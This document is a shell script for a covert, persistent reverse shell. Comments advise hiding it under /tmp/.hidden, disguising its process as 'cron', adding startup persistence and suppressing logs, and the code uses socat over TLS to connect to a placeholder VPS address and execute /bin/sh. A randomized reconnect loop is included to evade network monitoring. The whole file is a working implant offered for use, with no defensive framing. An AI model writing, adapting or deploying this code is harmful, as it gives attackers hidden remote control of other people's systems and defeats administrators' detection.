#!/bin/sh

# ------------------ Security Considerations ------------------
# 1. File Location and Naming:
#    - Store this script in an inconspicuous location such as /tmp/.hidden/ or /var/tmp/.
#    - Name the script something that blends with common system files, e.g., system-update.sh or cron.daily.

# 2. Process Management:
#    - Run the script in the background using nohup to prevent visibility in the terminal.
#    - Rename the process using exec -a to make it appear as a system process (e.g., cron or systemd).

# 3. Persistence:
#    - Set up a cron job, or add the script to /etc/rc.local or as a systemd service to ensure it runs on startup.

# 4. Log and Output Suppression:
#    - Redirect all output (stdout and stderr) to /dev/null to avoid leaving traces in logs.

# 5. Network Stealth:
#    - Randomize connection intervals to prevent detection by network monitoring tools.
#    - Consider tunneling traffic over a common port (e.g., port 443 for HTTPS) to blend in with legitimate traffic.

# 6. Minimize Disk Activity:
#    - Store only necessary files on disk, and clean up after execution using the trap command.
# ------------------ End of Security Considerations ------------------

# ------------------ Configuration ------------------
VPS_IP="VPS_IP"                        # Replace with your VPS IP
VPS_PORT=6969                          # Replace with your chosen port
CERT_PATH="/tmp/.hidden/client_cert.pem"   # Path to client certificate
CA_CERT_PATH="/tmp/.hidden/ca_cert.pem"    # Path to CA certificate
LOG_FILE="/dev/null"                   # Redirect logs to /dev/null to prevent logging
PROCESS_NAME="cron"                    # Desired process name (e.g., "cron", "syslogd")
# ------------------ End of Configuration ------------------

# ------------------ Helper Functions ------------------

# Check if a binary exists in PATH
check_binary() {
    type "$1" >/dev/null 2>&1
}

# Convert IP to little-endian hexadecimal
ip_to_hex_le() {
    echo "$1" | awk -F. '{ printf("%02X%02X%02X%02X", $4, $3, $2, $1) }'
}

# Check if a TCP connection is established using /proc/net/tcp
check_tcp_connection() {
    HEX_PORT=$(printf '%04X' "$VPS_PORT")          # Convert port to hex format
    HEX_IP_LE=$(ip_to_hex_le "$VPS_IP")            # Convert IP to little-endian hex format
    # Search for the IP and port in /proc/net/tcp
    grep -q "$HEX_IP_LE:$HEX_PORT " /proc/net/tcp
}

# Check if a connection is tracked in nf_conntrack (as fallback)
check_nf_conntrack() {
    grep -q "$VPS_IP" /proc/net/nf_conntrack 2>/dev/null
}

# Generate a random sleep time between MIN and MAX seconds
random_sleep() {
    MIN=$1
    MAX=$2
    # Attempt to use /dev/urandom for randomness
    if [ -r /dev/urandom ]; then
        num=$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')
    else
        # Fallback to using current time if /dev/urandom is unavailable
        num=$(date +%s | awk '{print $1}')
    fi
    sleep_time=$(( num % (MAX - MIN + 1) + MIN ))
    echo "$sleep_time"
}

# Rename the process
rename_process() {
    # Check if the script has already been renamed to prevent infinite loop
    if [ "$RENAMED" != "yes" ]; then
        exec -a "$PROCESS_NAME" "$0" "$@" RENAMED=yes
    fi
}

# Reconnect to the VPS if no active connection is found
reconnect() {
    echo "$(date): Reconnecting to $VPS_IP:$VPS_PORT..." > "$LOG_FILE"  # Log to /dev/null
    # Start socat with SSL and execute a shell
    nohup socat OPENSSL:"$VPS_IP:$VPS_PORT",cert="$CERT_PATH",cafile="$CA_CERT_PATH",verify=1 EXEC:/bin/sh > /dev/null 2>&1 &
}

# ------------------ End of Helper Functions ------------------

# ------------------ Initialization ------------------
trap "rm -f $LOG_FILE" EXIT  # Ensure clean up on exit (minimize disk traces)

rename_process  # Rename the process to appear as a system process
# ------------------ End of Initialization ------------------

# ------------------ Main Loop ------------------
while true; do
    # Check if connection is active via /proc/net/tcp or nf_conntrack
    if check_tcp_connection || check_nf_conntrack; then
        # Random sleep duration to avoid detection patterns
        SLEEP_DURATION=$(random_sleep 30 150)  # Sleep between 30 and 150 seconds
        sleep "$SLEEP_DURATION"
    else
        reconnect  # Reconnect if no active connection
    fi
done
# ------------------ End of Main Loop ------------------
